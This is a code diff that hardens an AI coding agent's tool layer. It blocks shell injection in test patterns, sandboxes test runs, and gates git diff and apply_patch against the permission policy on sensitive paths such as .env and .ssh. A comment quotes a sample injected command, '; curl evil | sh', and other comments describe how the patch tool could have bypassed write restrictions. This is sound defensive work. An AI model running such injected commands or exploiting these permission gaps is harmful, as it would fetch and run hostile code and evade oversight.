@@ -16,7 +16,7 @@ import { minimatch } from 'minimatch';
 import { redactSecrets } from '@excalibur/model-gateway';
 import type { ExcaliburConfig } from '@excalibur/shared';
 import { getNativeTool, type NativeToolName } from './native-tools';
-import type { PermissionEngine } from '../permissions/permission-engine';
+import { hasShellMetacharacters, type PermissionEngine } from '../permissions/permission-engine';
 import { runInDockerSandbox, type SandboxLimits } from '../sandbox/docker-sandbox';
 
 /**
@@ -93,6 +93,27 @@ function fail(result: string): ToolResult {
  * is a symlink, the realpath is re-checked so a symlink can never tunnel out of
  * the tree. Returns the absolute path on success, or an error string.
  */
+/** Target file paths a unified diff writes (`+++ b/x`, `--- a/x`, renames). */
+function diffTargetPaths(diff: string): string[] {
+  const paths = new Set<string>();
+  const add = (raw: string): void => {
+    const p = raw.trim().replace(/^[ab]\//, '');
+    if (p.length > 0 && p !== '/dev/null') paths.add(p);
+  };
+  for (const line of diff.split('\n')) {
+    const header = /^(?:\+\+\+|---) (.+)$/.exec(line);
+    if (header) add(header[1] as string);
+    const git = /^diff --git a\/(.+?) b\/(.+)$/.exec(line);
+    if (git) {
+      add(git[1] as string);
+      add(git[2] as string);
+    }
+    const rename = /^rename (?:from|to) (.+)$/.exec(line);
+    if (rename) add(rename[1] as string);
+  }
+  return [...paths];
+}
+
 function assertConfined(workdir: string, relPath: string): { abs: string } | { error: string } {
   if (typeof relPath !== 'string' || relPath.length === 0) {
     return { error: 'empty path' };
@@ -492,11 +513,30 @@ async function execRunTests(
 ): Promise<ToolResult> {
   const override = args['command'] as string | undefined;
   const pattern = args['pattern'] as string | undefined;
+  // SECURITY: `pattern` is concatenated into a shell command, so a `pattern`
+  // like `; curl evil | sh` would inject. A test filter never needs shell
+  // metacharacters — refuse them outright (the gate elsewhere checks `command`).
+  if (pattern !== undefined && hasShellMetacharacters(pattern)) {
+    return fail('test pattern must not contain shell metacharacters');
+  }
   const base = override ?? ctx.config.commands?.test ?? 'npm test';
   const command = pattern !== undefined ? `${base} ${pattern}` : base;
+  // Gate the EXACT composed command (not just `base`) — defeats checked≠executed.
   const decision = ctx.permissions.checkCommand(command);
   if (!decision.allowed) {
     return fail(`permission denied: ${decision.reason}`);
+  }
+  // Honour the sandbox for test execution too (was host-only — a gap vs run_command).
+  const sandbox = ctx.config.sandbox;
+  if (sandbox?.enabled === true) {
+    const limits: SandboxLimits = {
+      ...(sandbox.image !== undefined ? { image: sandbox.image } : {}),
+      ...(sandbox.memoryMb !== undefined ? { memoryMb: sandbox.memoryMb } : {}),
+      ...(sandbox.cpus !== undefined ? { cpus: sandbox.cpus } : {}),
+      ...(sandbox.network !== undefined ? { allowNetwork: sandbox.network } : {}),
+    };
+    const sb = runInDockerSandbox(path.resolve(ctx.workdir), command, limits);
+    return formatCommandResult(command, sb.exitCode, `${sb.stdout}${sb.stderr}`.trim(), sb.timedOut);
   }
   const { code, output, timedOut } = await runProcess(command, [], {
     cwd: path.resolve(ctx.workdir),
@@ -536,6 +576,12 @@ async function execGitDiff(
       if ('error' in confined) {
         return fail(`rejected: ${confined.error}`);
       }
+      // SECURITY: refuse to diff a blocked path (e.g. `git diff -- .env`) — read
+      // is gated like read_file, not left to output redaction alone.
+      const decision = ctx.permissions.checkPath(relPath, 'read');
+      if (!decision.allowed) {
+        return fail(`rejected: reading "${relPath}" is blocked (${decision.reason})`);
+      }
     }
     gitArgs.push('--', ...paths);
   }
@@ -556,6 +602,20 @@ async function execApplyPatch(
   ctx: ToolExecutionContext,
 ): Promise<ToolResult> {
   const diff = args['diff'] as string;
+  // SECURITY: `git apply` only refuses OUT-OF-TREE writes; an IN-TREE diff could
+  // still create/overwrite a blocked path (.env, *.key, .ssh/**) that write_file
+  // denies — a clean bypass. Gate every target path through checkPath('write')
+  // (and confine it) BEFORE applying, so apply_patch honours the same policy.
+  for (const target of diffTargetPaths(diff)) {
+    const confined = assertConfined(ctx.workdir, target);
+    if ('error' in confined) {
+      return fail(`patch rejected: ${confined.error}`);
+    }
+    const decision = ctx.permissions.checkPath(target, 'write');
+    if (!decision.allowed) {
+      return fail(`patch rejected: writing "${target}" is blocked (${decision.reason})`);
+    }
+  }
   // `git apply` (no --unsafe-paths) refuses out-of-tree / absolute paths itself.
   const { code, output, timedOut } = await runProcess('git', ['apply', '--whitespace=nowarn', '-'], {
     cwd: path.resolve(ctx.workdir),
